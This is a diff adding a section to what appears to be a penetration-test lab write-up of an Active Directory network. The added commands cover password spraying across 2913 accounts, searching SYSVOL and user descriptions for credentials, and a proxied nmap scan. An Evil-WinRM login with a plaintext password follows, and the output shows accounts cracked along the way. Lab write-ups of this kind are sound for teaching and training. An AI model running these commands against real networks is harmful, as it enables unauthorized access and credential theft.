@@ -807,3 +807,58 @@ hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt
 ```
 After it runs, we see that we get the password "lucky7" for the user backupjob01 and SPN veem001, however upon searching BloodHound this account does not seem to be useful.
 
+Now we can try passwordspraying some common passwords in the domain using a powershell module like DomainPasswordSpray.ps1 
+```
+Invoke-DomainPasswordSpray -Password Welcome1
+
+[*] Current domain is compatible with Fine-Grained Password Policy.
+[*] The domain password policy observation window is set to  minutes.
+[*] Setting a  minute wait in between sprays.
+
+Confirm Password Spray
+Are you sure you want to perform a password spray against 2913 accounts?
+[Y] Yes  [N] No  [?] Help (default is "Y"): y
+[*] Password spraying has begun with  1  passwords
+[*] This might take a while depending on the total number of users
+[*] Now trying password Welcome1 against 2913 users. Current time is 11:47 AM
+[*] SUCCESS! User:kdenunez Password:Welcome1
+[*] SUCCESS! User:mmertle Password:Welcome1
+[*] Password spraying is complete
+```
+We have two users with the Welcome1 password, but neither has interesting access. 
+
+```
+proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
+```
+We can use this command using the gpp_autologin module, which searches for Group Policy Preferences (GPP) credentials in the SYSVOL share attempting to retrieve plaintext credentials. Unfortunately this does not give us anything useful.
+
+We also use a command to check AD for account descriptions for credentials:
+```
+Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}
+```
+but nothing useful pops up either.
+
+We can move onto the other host we haven't touched: 172.16.8.50. We check if WinRM is enabled on this host so that we can potentially login with Evil-WinRM. The port for WinRM is 5985 so we can do an nmap scan:
+```
+proxychains nmap -sT -p 5985 172.16.8.50
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 14:59 EDT
+|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:80-<--timeout
+|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
+Nmap scan report for 172.16.8.50
+Host is up (0.12s latency).
+
+PORT     STATE SERVICE
+5985/tcp open  wsman
+
+Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
+```
+It is up so we can use Evil-WinRM to remote in:
+```
+proxychains evil-winrm -i 172.16.8.50 -u backupadm -p ILFreightnixadm!
+```
+Since WinRM uses a kerberos ticket to authenticate, we won't be able to authenticate when using certain tools due to the Kerberos double-hop problem, so we need to set up a PSCredential object using PowerView to workaround that. 
+
+
+
+
